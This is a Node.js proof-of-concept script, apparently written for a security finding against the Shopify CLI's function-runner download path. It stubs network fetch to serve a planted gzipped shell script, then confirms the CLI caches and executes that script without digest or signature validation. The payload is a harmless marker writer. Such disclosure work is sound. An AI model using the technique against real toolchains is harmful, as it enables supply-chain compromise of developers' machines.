#!/usr/bin/env node
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import crypto from 'node:crypto'
import zlib from 'node:zlib'
import {fileURLToPath, pathToFileURL} from 'node:url'

const findingDir = path.dirname(fileURLToPath(import.meta.url))
const repoRoot = path.resolve(findingDir, '..', '..', '..')
const evidenceDir = path.join(findingDir, 'evidence')
const workDir = path.join(evidenceDir, 'work')
const binariesSrc = path.join(repoRoot, 'packages/app/src/cli/services/function/binaries.ts')
const runnerSrc = path.join(repoRoot, 'packages/app/src/cli/services/function/runner.ts')

function sha256(file) {
  return crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex')
}

function writeStubs() {
  const stubs = path.join(workDir, 'stubs')
  fs.mkdirSync(stubs, {recursive: true})
  fs.writeFileSync(
    path.join(stubs, 'path.mjs'),
    `import path from 'node:path'\nexport const dirname = path.dirname\nexport const joinPath = path.join\n`,
  )
  fs.writeFileSync(path.join(stubs, 'output.mjs'), `export function outputDebug() {}\n`)
  fs.writeFileSync(
    path.join(stubs, 'retry.mjs'),
    `export async function performActionWithRetryAfterRecovery(action) { return action() }\n`,
  )
  fs.writeFileSync(
    path.join(stubs, 'node-package-manager.mjs'),
    `export function versionSatisfies() { return true }\n`,
  )
  fs.writeFileSync(
    path.join(stubs, 'http.mjs'),
    `import {createReadStream, appendFileSync, statSync} from 'node:fs'\n` +
      `export async function fetch(url, init, mode) {\n` +
      `  appendFileSync(process.env.POC_FETCH_LOG, JSON.stringify({url: String(url), mode, artifact: process.env.POC_RELEASE_ARTIFACT, bytes: statSync(process.env.POC_RELEASE_ARTIFACT).size}) + '\\n')\n` +
      `  return {status: 200, body: createReadStream(process.env.POC_RELEASE_ARTIFACT)}\n` +
      `}\n`,
  )
  fs.writeFileSync(
    path.join(stubs, 'fs.mjs'),
    `import fs from 'node:fs'\n` +
      `import os from 'node:os'\n` +
      `import path from 'node:path'\n` +
      `import {chmod as realChmod, mkdir as realMkdir, rename, rm, mkdtemp} from 'node:fs/promises'\n` +
      `export async function fileExists(p) { return fs.existsSync(p) }\n` +
      `export const createFileWriteStream = fs.createWriteStream\n` +
      `export async function mkdir(p) { return realMkdir(p, {recursive: true}) }\n` +
      `export async function chmod(p, mode) { return realChmod(p, typeof mode === 'string' ? Number.parseInt(mode, 8) : mode) }\n` +
      `export async function moveFile(src, dst, options = {}) { if (options.overwrite && fs.existsSync(dst)) fs.rmSync(dst, {force: true}); await realMkdir(path.dirname(dst), {recursive: true}); return rename(src, dst) }\n` +
      `export async function inTemporaryDirectory(fn) { const dir = await mkdtemp(path.join(os.tmpdir(), 'shopify-function-poc-')); try { return await fn(dir) } finally { await rm(dir, {recursive: true, force: true}) } }\n`,
  )
  fs.writeFileSync(
    path.join(stubs, 'system.mjs'),
    `import {spawnSync} from 'node:child_process'\n` +
      `import {appendFileSync} from 'node:fs'\n` +
      `export async function exec(command, args = [], options = {}) {\n` +
      `  const result = spawnSync(command, args, {cwd: options.cwd, env: process.env, encoding: 'utf8'})\n` +
      `  appendFileSync(process.env.POC_EXEC_LOG, JSON.stringify({command, args, cwd: options.cwd, status: result.status, error: result.error?.message}) + '\\n')\n` +
      `  if (result.stdout) { if (options.stdout === 'inherit' || !options.stdout) process.stdout.write(result.stdout); else if (options.stdout.write) options.stdout.write(result.stdout) }\n` +
      `  if (result.stderr) { if (options.stderr === 'inherit' || !options.stderr) process.stderr.write(result.stderr); else if (options.stderr.write) options.stderr.write(result.stderr) }\n` +
      `  if (result.error || result.status !== 0) throw result.error ?? new Error('process exited with code ' + result.status)\n` +
      `  return result.stdout\n` +
      `}\n`,
  )
}

function stripInterface(source, name, exported = false) {
  const prefix = exported ? 'export\\s+' : ''
  return source.replace(new RegExp(`${prefix}interface\\s+${name}\\s+\\{[\\s\\S]*?\\n\\}`, 'm'), '')
}

function transformBinaries(source) {
  return stripInterface(stripInterface(source, 'DownloadableBinary'), 'BinaryDependencies', true)
    .replace("import {joinPath, dirname} from '@shopify/cli-kit/node/path'", "import {joinPath, dirname} from './stubs/path.mjs'")
    .replace("import {chmod, createFileWriteStream, fileExists, inTemporaryDirectory, mkdir, moveFile} from '@shopify/cli-kit/node/fs'", "import {chmod, createFileWriteStream, fileExists, inTemporaryDirectory, mkdir, moveFile} from './stubs/fs.mjs'")
    .replace("import {outputDebug} from '@shopify/cli-kit/node/output'", "import {outputDebug} from './stubs/output.mjs'")
    .replace("import {performActionWithRetryAfterRecovery} from '@shopify/cli-kit/common/retry'", "import {performActionWithRetryAfterRecovery} from './stubs/retry.mjs'")
    .replace("import {fetch} from '@shopify/cli-kit/node/http'", "import {fetch} from './stubs/http.mjs'")
    .replace("import {versionSatisfies} from '@shopify/cli-kit/node/node-package-manager'", "import {versionSatisfies} from './stubs/node-package-manager.mjs'")
    .replace("import {PipelineSource} from 'stream'\n", '')
    .replace("import {pipeline} from 'stream/promises'", "import {pipeline} from 'node:stream/promises'")
    .replace("import stream from 'node:stream/promises'", "import * as stream from 'node:stream/promises'")
    .replace(/ implements DownloadableBinary/g, '')
    .replace(/^\s*(?:private\s+)?readonly\s+\w+:.*\n/gm, '')
    .replace(/: BinaryDependencies \| null/g, '')
    .replace(/: DownloadableBinary/g, '')
    .replace(/: PipelineSource<unknown>/g, '')
    .replace(/: fs\.WriteStream/g, '')
    .replace(/: Promise<void>/g, '')
    .replace(/: string(?=\s*(?:[=,)\n]))/g, '')
    .replace(/: boolean(?=\s*(?:[=,)\n]))/g, '')
    .replace(/new Map<string, Promise<void>>\(\)/g, 'new Map()')
    .replace(/ as DownloadableBinary/g, '')
}

function transformRunner(source) {
  return stripInterface(source, 'FunctionRunnerOptions')
    .replace("import {functionRunnerBinary, downloadBinary} from './binaries.js'", "import {functionRunnerBinary, downloadBinary} from './binaries.mjs'")
    .replace("import {validateShopifyFunctionPackageVersion} from './build.js'", "async function validateShopifyFunctionPackageVersion() { return {functionRunner: '9.1.2'} }")
    .replace(/import \{ExtensionInstance\} from '..\/..\/models\/extensions\/extension-instance\.js'\n/, '')
    .replace(/import \{FunctionConfigType\} from '..\/..\/models\/extensions\/specifications\/function\.js'\n/, '')
    .replace("import {exec} from '@shopify/cli-kit/node/system'", "import {exec} from './stubs/system.mjs'")
    .replace("import {joinPath} from '@shopify/cli-kit/node/path'", "import {joinPath} from './stubs/path.mjs'")
    .replace("import {Readable, Writable} from 'stream'\n", '')
    .replace(/: ExtensionInstance<FunctionConfigType>/g, '')
    .replace(/: FunctionRunnerOptions/g, '')
    .replace(/: string\[\]/g, '')
}

function writeHarnessFiles() {
  writeStubs()
  fs.writeFileSync(path.join(workDir, 'binaries.mjs'), transformBinaries(fs.readFileSync(binariesSrc, 'utf8')))
  fs.writeFileSync(path.join(workDir, 'runner.mjs'), transformRunner(fs.readFileSync(runnerSrc, 'utf8')))
}

async function main() {
  fs.mkdirSync(evidenceDir, {recursive: true})
  fs.rmSync(workDir, {recursive: true, force: true})
  fs.rmSync(path.join(evidenceDir, 'bin'), {recursive: true, force: true})
  fs.mkdirSync(workDir, {recursive: true})
  fs.writeFileSync(path.join(evidenceDir, 'setup.sh'), `#!/bin/sh\nset -eu\nnode --version\n`, {mode: 0o755})
  fs.writeFileSync(path.join(evidenceDir, 'setup.log'), `Self-contained local PoC; no external service provisioning required. The fetch stub emulates a compromised upstream release asset.\n$ ./setup.sh\n${process.version}\n`)
  fs.writeFileSync(path.join(evidenceDir, 'exploit.sh'), `#!/bin/sh\nset -eu\ncd ${JSON.stringify(repoRoot)}\nmkdir -p ${JSON.stringify(evidenceDir)}\nnode ${JSON.stringify(path.join(findingDir, 'poc.js'))} | tee ${JSON.stringify(path.join(evidenceDir, 'exploit.log'))}\n`, {mode: 0o755})
  fs.writeFileSync(path.join(evidenceDir, 'fetch.log'), '')
  fs.writeFileSync(path.join(evidenceDir, 'exec.log'), '')
  fs.writeFileSync(path.join(evidenceDir, 'impact.log'), '')

  if (!fs.existsSync(binariesSrc) || !fs.existsSync(runnerSrc)) throw new Error('function toolchain source files not found')
  if (!['linux', 'darwin'].includes(process.platform)) {
    console.log(JSON.stringify({status: 'inconclusive', evidence: 'PoC supports linux/darwin local execution', notes: `unsupported platform ${process.platform}`}))
    return
  }

  fs.writeFileSync(
    path.join(evidenceDir, 'env-info.txt'),
    [`node=${process.version}`, `platform=${process.platform}`, `arch=${process.arch}`, `hostname=${os.hostname()}`, `repo=${repoRoot}`].join('\n') + '\n',
  )
  fs.writeFileSync(
    path.join(evidenceDir, 'healthcheck.log'),
    [`binaries.ts sha256=${sha256(binariesSrc)}`, `runner.ts sha256=${sha256(runnerSrc)}`].join('\n') + '\n',
  )

  const payload = path.join(workDir, 'function-runner')
  fs.writeFileSync(
    payload,
    `#!/bin/sh\n` +
      `printf 'function-runner payload executed\\n' >> "$POC_IMPACT_FILE"\n` +
      `printf 'argv=%s\\n' "$*" >> "$POC_IMPACT_FILE"\n` +
      `printf 'cwd=%s\\n' "$(pwd)" >> "$POC_IMPACT_FILE"\n` +
      `printf 'uid=%s\\n' "$(id -u)" >> "$POC_IMPACT_FILE"\n` +
      `printf '{"ok":true,"poc":"downloaded function-runner executed"}\\n'\n`,
    {mode: 0o755},
  )
  fs.chmodSync(payload, 0o755)
  const gzPayload = path.join(workDir, 'function-runner.gz')
  fs.writeFileSync(gzPayload, zlib.gzipSync(fs.readFileSync(payload)))

  writeHarnessFiles()

  const functionDir = path.join(workDir, 'example-function')
  fs.mkdirSync(path.join(functionDir, 'dist'), {recursive: true})
  fs.writeFileSync(path.join(functionDir, 'dist', 'function.wasm'), 'not a real wasm module; the malicious runner runs before validating it\n')

  process.env.POC_RELEASE_ARTIFACT = gzPayload
  process.env.POC_IMPACT_FILE = path.join(evidenceDir, 'impact.log')
  process.env.POC_FETCH_LOG = path.join(evidenceDir, 'fetch.log')
  process.env.POC_EXEC_LOG = path.join(evidenceDir, 'exec.log')

  const {runFunction} = await import(pathToFileURL(path.join(workDir, 'runner.mjs')).href)
  const stdoutChunks = []
  const stderrChunks = []
  const writable = (chunks) => ({write(chunk) { chunks.push(Buffer.isBuffer(chunk) ? chunk.toString('utf8') : String(chunk)) }})
  await runFunction({
    functionExtension: {
      features: ['function'],
      isJavaScript: false,
      configuration: {build: {}},
      directory: functionDir,
      outputPath: path.join(functionDir, 'dist', 'function.wasm'),
    },
    input: '{}',
    stdout: writable(stdoutChunks),
    stderr: writable(stderrChunks),
  })

  const impact = fs.readFileSync(path.join(evidenceDir, 'impact.log'), 'utf8')
  const fetches = fs.readFileSync(path.join(evidenceDir, 'fetch.log'), 'utf8').trim()
  const execs = fs.readFileSync(path.join(evidenceDir, 'exec.log'), 'utf8').trim()
  const installedPath = JSON.parse(execs.split('\n').filter(Boolean).at(-1)).command
  const installed = fs.existsSync(installedPath) ? fs.readFileSync(installedPath, 'utf8') : ''
  const mode = fs.existsSync(installedPath) ? (fs.statSync(installedPath).mode & 0o777).toString(8) : 'missing'
  const marker = impact.includes('function-runner payload executed') && installed.includes('downloaded function-runner executed')

  const human = [
    `fetch log: ${fetches}`,
    `exec log: ${execs}`,
    `installed binary: ${installedPath}`,
    `installed mode: ${mode}`,
    `runner stdout: ${stdoutChunks.join('').trim()}`,
    `runner stderr: ${stderrChunks.join('').trim()}`,
    `impact log: ${impact.trim().replaceAll('\n', ' | ')}`,
  ].join('\n') + '\n'
  fs.appendFileSync(path.join(evidenceDir, 'exploit.log'), human)
  process.stdout.write(human)
  console.log(JSON.stringify({
    status: marker ? 'confirmed' : 'failed',
    evidence: marker ? 'impact.log shows downloaded function-runner payload executed by app function runner path' : 'payload execution marker missing',
    notes: marker ? 'downloadBinary accepted gzipped upstream bytes, chmodded/cached them, and runFunction executed the cached path without digest/signature validation' : 'download or execution did not complete',
  }))
}

main().catch((error) => {
  console.error(error.stack || error.message)
  console.log(JSON.stringify({status: 'failed', evidence: 'PoC runtime error', notes: error.message}))
  process.exitCode = 1
})
